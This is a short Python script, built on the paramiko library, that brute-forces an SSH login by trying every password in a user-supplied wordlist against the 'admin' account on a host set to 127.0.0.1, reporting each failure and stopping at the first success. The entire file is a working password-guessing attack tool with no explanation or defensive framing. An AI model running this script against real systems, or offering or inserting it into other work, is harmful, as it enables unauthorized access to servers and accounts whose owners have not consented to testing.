
import paramiko

def ssh_brute():
    hostname = "127.0.0.1" #ssh ip
    username = "admin" #ssh Username
    pass_file = input("Enter your password file path: ")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(pass_file, 'r') as file:
        for line in file:
            password = line.strip()
            try:
                ssh.connect(hostname=hostname, username=username, password=password, timeout=3)
                print(f"[+] Success: Password found -> {password}")
                ssh.close()
                return password
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {password}")
            except Exception as e:
                print(f"[!] Error: {str(e)}")
    return "[-] Password not found."

print(ssh_brute())
